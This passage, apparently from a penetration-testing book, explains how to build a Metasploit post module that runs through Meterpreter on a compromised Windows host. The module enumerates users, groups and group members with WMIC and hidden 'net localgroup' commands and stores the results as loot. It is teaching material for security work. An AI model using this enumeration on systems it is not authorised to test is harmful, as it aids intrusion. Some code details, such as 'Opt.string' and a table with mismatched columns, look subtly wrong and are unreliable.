# Building a Basic Script

We have built a few pieces of shellcode so far in this chapter. We have ways to list users, groups, and network information. The next step is to take this code and put it in a format where we can easily run it when we compromise a host. Metasploit post modules are an easy way to do this. They are written in Ruby and can be executed in Meterpreter once we have a shell. The post modules are similar to our exploit modules that we work in Chapter 9, Exploitation scripting, but work inside Meterpreter instead of Metasploit.

The post modules are kept in the same tree as other Metasploit modules. For our example, we're going to create the wininfo.rb file in ~/msf/modules/post/windows/gather/ directory. To build our scripts, we can take fragments that others have written and combine them into custom tools that perform the functions we need.

First, we need to determine what options we want to have for our script. It would be nice for our script to be able to list users, group, and network information. At times, we may want one, two, or all three options. To do this, we will use the built-in option handling in Metasploit. Let's take a look.

```ruby
# This module requires Metasploit:
# https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
require 'msf/core'
require 'rex'
class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::WMIC
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Gather Basic Information About a System',
      'Description' => 'This module will enumerate users, groups, and network information',
      'License' => MSF_LICENSE,
      'Author' => ['Ryan Linn <sussurro[at]happypacket.net>'],
      'Platform' => ['win'],
      'SessionTypes' => ['meterpreter'])
    )
    register_options(
      [
        Opt.string('INFO', [false, 'Information to gather (User/Group/Network)')
      ], self.class)
  end
```

This looks very similar to the start of our exploit module. We are including a series of Mix-Ins that will allow us to interact with the Registry, Accounts, and WMIC. We include the standard information in the initialize function, but notice here we don't have to set anything about a payload because there is no payload. We also have a block of code to register options. In this case, we have created a string called INFO that someone can set values they want to retrieve. We can put U for user, G for group, or N for network, or any combination of the previous values to retrieve multiple pieces of data in one pass.

Next we are creating three functions: get_users, get_group, and get_net. These are going to allow us to put the code relating to each of the areas in its own function so that we can copy them elsewhere if we need to as well as that we can more easily keep track of what is happening. Let's look at the get_users function first.

```ruby
def get_users()
    users = []
    data = wmic_query('account list brief /FORMAT:csv').split("\n")
    # Take the domain name, and sid out of the WMIC output, online
    data[2..-1].each do |line|
        tmp = line.rstrip().split(',')
        userinfo = [tmp[0], tmp[5], tmp[6]]
        userinfo << registry_key_exist?("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\#{userinfo[2]}")
        users << userinfo
    end
    # Generate a table with output
    tbl = Rex::Ui::Table.new(
        'Header' => 'System Users',
        'Indent' => 1,
        'Columns' => %w(Username SID Profile))
    users.each do |user|
        tbl << user
    end
    print_line("\n" + tbl.to_s + "\n")
    store_loot('host.users', '/text/plain', session, tbl.to_s, 'System Users')
end
```

Our get_users function begins by defining an array called users. We use wmic to get the information, but we want the username, the SID, and whether the profile list exists. The userinfo array stores these values. We generate a table with output and print it.

```ruby
def get_group()
    groups = []
    data = wmic_query('group list brief /FORMAT:csv').split("\n")
    data[3..-1].each do |line|
        line.rstrip!
        info = line.split(',')[3..-1]
        groups << info
    end
    tbl = Rex::Ui::Table.new(
        'Header' => 'System Groups',
        'Indent' => 1,
        'Columns' => %w(Name SID Members))
    print_status('Dumping groups.. please wait')
    groups.each do |group|
        p = session.sys.process.execute("cmd /c net localgroup #{group[0]}", nil, 'Hidden' => true, 'Channelized' => true)
        out = data = ''
        while (data = p.channel.read)
            out << data
        end
        p.channel.close
        valid = out.split("\r\n")[6..-2]
        group[2] = ''
        group[2] = valid.join(',') unless valid.empty?
        tbl << [group[1], group[0], group[2]]
    end
    print_line("\n" + tbl.to_s + "\n")
    store_loot('host.groups', '/text/plain', session, tbl.to_s, 'System Groups')
end
```

Our get_group function starts similarly to how we did the users function. We create an array to hold our group data in. Next we query the WMI data about groups. We take the last two fields, the name and the SID for the group from the WMI output. We add these into the groups array for reference later. We use `net localgroup` to get the members of each group. We set up the table and print the results.
